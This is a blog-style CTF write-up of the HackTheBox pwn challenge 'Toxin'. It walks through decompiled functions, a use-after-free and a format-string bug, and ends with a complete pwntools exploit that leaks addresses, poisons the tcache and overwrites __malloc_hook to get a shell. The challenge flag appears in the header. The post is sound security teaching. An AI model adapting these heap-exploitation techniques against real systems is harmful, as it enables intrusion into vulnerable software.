---
layout:     post
title:      "HackTheBox Pwn: Toxin"
subtitle:   "Write-Up"
date:       2021-02-13
author:     "D4mianwayne"
tags:    ["pwn, tcache, libc-2.27, hackthebox"]
categories: ["HackTheBox"]
theme: blink
img: "/img/pwned.png"
password:  "HTB{tc4ch3_t0x1n4t10n???_0r_tc4ch3_p01So1n1NG??+F0rm4t...4m@ZiNg!!!}"
layout: "simple"

---


This challenge on the HackTheBox was released recently, the archive attachment contains the following files:

* `toxin`: The binary
* `ld-2.27.so` and the `libc-2.27` file.

The given LIBC files hinted towards the binary running on the Ubuntu 18.04 aka Bionic Beaver.

# Reverse Engineering

Using the IDA, here's the pseudocode equivalence of the function:-


##### `add` function

The `add` function was as follows:-

```C
int add_toxin()
{
  int v1; // ebx
  int v2; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]

  puts("A new toxin! Fascinating.");
  printf("Toxin chemical formula length: ");
  __isoc99_scanf("%lu", &size);
  if ( size > 0xE0 )
    return puts("Chemical formula too long.");
  printf("Toxin index: ");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0 || v2 > 2 || toxins[v2] )
    return puts("Invalid toxin index.");
  sizes[v2] = size;
  v1 = v2;
  toxins[v1] = malloc(size);
  printf("Enter toxin formula: ");
  return read(0, toxins[v2], size);
}
```

This function was responsible for taking the `size` and allocate a chunk via `malloc` with the given `size` and add it to the gloabl pointer `toxins`, The takeaways from this function was the `size` restriction was that we can allocate chunks upto 0x70 `size` and since the `index` given must be in within `index < 0  || index > 2` it'll throw an error, same as for if the chunk is occupied in the global array, it'll just throw the error.

##### `free` function

This function handles the `free` functionality for this binary:-

```C
void drink_toxin()
{
  int index; // [rsp+Ch] [rbp-4h]

  puts("This is dangerous testing, I'm warning you!");
  printf("Toxin index: ");
  __isoc99_scanf("%d", &index);
  if ( index >= 0 && index <= 2 && toxins[index] )
  {
    if ( toxinfreed )
    {
      puts("You can only drink toxins once, they're way too poisonous to try again.");
    }
    else
    {
      toxinfreed = 1;
      free(toxins[index]);
    }
  }
  else
  {
    puts("Invalid toxin index.");
  }
}
```

This function also has constraints which include that we can only call `free` once, that means we can only have one `free` chunk. Although when it does `free(toxins[index])` it does not NULL out the chunk which might lead to the **Use After Free**. It also does not make the global pointer `toxins[index]` to `0` which made this kind of difficult since even if we free this function we won't be able to allocate a new chunk, making us unable to allocate chunk unless the global pointer is not NULL'd out.


##### `edit` function

The `edit` function:-

```C
int edit_toxin()
{
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Adjusting an error?");
  printf("Toxin index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 || v1 > 2 || !toxins[v1] )
    return puts("Invalid toxin index.");
  printf("Enter toxin formula: ");
  return read(0, toxins[v1], sizes[v1]);
}
```
The function was responsible for editing the alloctaed chunks, although using this, since it only checks whether the global pointer is NULL'd or not and the `free` function does not NULL's out that global pointer, we have a **Use After Free** vulnerability here, which gave us the ability to overwrite the `fd` & `bk` pointer of a `free`'d chunk.


##### `search` function


This function allow us to search for a chunk from the global pointer, but there's a catch with `printf` here.

```C
int search_toxin()
{
  int i; // [rsp+4h] [rbp-Ch]
  char s; // [rsp+Ah] [rbp-6h]

  puts("Time to search the archives!");
  memset(&s, 0, 6uLL);
  printf("Enter search term: ");
  read(0, &s, 5uLL);
  for ( i = 0; i <= 2; ++i )
  {
    if ( toxins[i] && !strcmp(&s, (const char *)toxins[i]) )
      return printf("Found at index %d!\n", (unsigned int)i);
  }
  printf(&s);
  return puts(" not found.");
}
```

Given the search string, it searches for the chunk(drink) allocated, then it prints the pattern given without any specified, which made this suspectible to format string vulnerability.

# Exploitation

The methodology to exploit this is listed as follows:-

* Leak LIBC and ELF address from the format string vulnerability from the `search_toxin` function.
* Allocate a chunk.
* Free that chunk
* Edit that chunk with the address of the `toxinfreed` - 0x13, which pointed towards a valid `free`'d chunk pointer.
* Then do one allocation for returning the first free'd pointer, then for third allocation it'll return the `toxinfreed` address.
* Overwrite the `toxins` array's first index with a pointer to the `__malloc_hook` and then null out the other chunks in `toxins` array.
* Edit the chunk `0` since it was overwritten with the `___malloc_hook`, overwrite it with `one_gadget`
* Do one more allocation, eventually calling the `__malloc_hook`, resulting in the `one_gadget` jump and have a shell.

Moving on, we make the utlity functions:-


```py
from pwn import *

p = remote("159.65.84.169", 31307)
elf = ELF("toxin")
libc = elf.libc

def alloc(idx, size, content):
	p.sendlineafter("> ", "1")
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", str(idx))
	p.sendafter(": ", content)

def edit(idx, content):
	p.sendlineafter("> ", "2")
	p.sendlineafter(": ", str(idx))
	p.sendafter(": ", content)

def free(idx):
	p.sendlineafter("> ", "3")
	p.sendlineafter(": ", str(idx))

def search_toxin(string):
	p.sendlineafter("> ", "4")
	p.sendlineafter(": ", string)
```

Now, these functions will help us to interact with the binary more freely, then we have leak the LIBC and ELF address from the `search_toxin` which are located at `3`rd and `9`th index.

```py
search_toxin("%3$p")
libc.address = int(p.recvline().strip(b"\n"), 16) - 0x110081
log.info("LIBC:  0x%x" %(libc.address))

search_toxin("%9$p")
elf.address = int(p.recvline().strip(b"\n"), 16) - 0x1284
log.info("ELF:  0x%x" %(elf.address))
```

Then, we allocate a chunk at index `0` and free it:-

```py
alloc(0, 0x70, "AAAA")
free(0)
```

Now, we overwrite the `fd` of that `free`'d chunk with the `toxinfreed - 0x13` which was identical for the structure of a chunk with the size being in `0x7f`.


```asm
gef➤  x/12xg &toxinfreed
0x555555558050 <toxinfreed>:	0x0000000000000000	0x0000000000000000
0x555555558060 <toxins>:	0x0000000000000000	0x0000000000000000
0x555555558070 <toxins+16>:	0x0000000000000000	0x0000000000000000
0x555555558080 <sizes>:	0x0000000000000000	0x0000000000000000
0x555555558090 <sizes+16>:	0x0000000000000000	0x0000000000006000
0x5555555580a0:	0x0000000000000000	0x0001000300000000
gef➤  x/2xg 0x555555558050 - 0x13
0x55555555803d:	0xfff7dd0680000000	0x000000000000007f
```

As you can it has the size as `0z7f`, it is identical to the structure of the chunk. 

```py
edit(0, p64(elf.symbols['toxinfreed'] - 0x13))
```
Now. we will do a one more allocation and with the second allocation at index 2 will return out target chunk that is `toxinfreed`.

```py
alloc(1, 0x70, "BBBBB")
```


Now. we will craft a payload which will overwrite the `toxinfreed` as well as the index of the first chunk from the `toxins` with `__malloc_hook` as `toxinsfreed` variable and the `toxins` are stored contogously.

```py
payload = b"\x00"*35
payload += p64(libc.symbols['__malloc_hook'])
payload += p64(0)*3
payload += p64(0x70)
alloc(2, 0x70, payload)
```

![toxins_array](/img/pwning/toxin/malloc_hook.png)

We overwrite the `toxins` array with the 0th index being the pointer to the `__malloc_hook`.

Now, we request for the `edit` function with index `0` that, since overwritten by the `__malloc_hook`, it'll just return that pointer and we overwrite it with the `one_gadget` address.

```
edit(0, p64(libc.address + 0x10a38c))
```

![one_gadget)(/one_gadget.png)

Now, since we overwritten with `__malloc_hook` with the `one_gadget`, we request for one more chunk, which in turn calls `malloc` from `add` function and eventually calling the `__malloc_hook`:-

```py
p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(0x70))
p.sendlineafter(": ", "1")
p.interactive() 
```

Running the exploit:-

![shell](/img/pwning/toxin/shell.png)

Then, running it against the server, we get the flag:-

![](/img/pwning/toxin/flag.png)

# Exploit

The full exploit:-

```asm
from pwn import *

p = remote("206.189.18.188", 32695)
elf = ELF("toxin")
libc = elf.libc

def alloc(idx, size, content):
	p.sendlineafter("> ", "1")
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", str(idx))
	p.sendafter(": ", content)

def edit(idx, content):
	p.sendlineafter("> ", "2")
	p.sendlineafter(": ", str(idx))
	p.sendafter(": ", content)

def free(idx):
	p.sendlineafter("> ", "3")
	p.sendlineafter(": ", str(idx))

def search_toxin(string):
	p.sendlineafter("> ", "4")
	p.sendlineafter(": ", string)


search_toxin("%3$p")
libc.address = int(p.recvline().strip(b"\n"), 16) - 0x110081
log.info("LIBC:  0x%x" %(libc.address))

search_toxin("%9$p")
elf.address = int(p.recvline().strip(b"\n"), 16) - 0x1284
log.info("ELF:  0x%x" %(elf.address))

alloc(0, 0x70, "AAAA")
free(0)
edit(0, p64(elf.symbols['toxinfreed'] - 0x13))


alloc(1, 0x70, "BBBBB")

payload = b"\x00"*35
payload += p64(libc.symbols['__malloc_hook'])
payload += p64(0)*3
payload += p64(0x70)
alloc(2, 0x70, payload)

edit(0, p64(libc.address + 0x10a38c))
p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(0x70))
p.sendlineafter(": ", "1")

p.interactive()
```


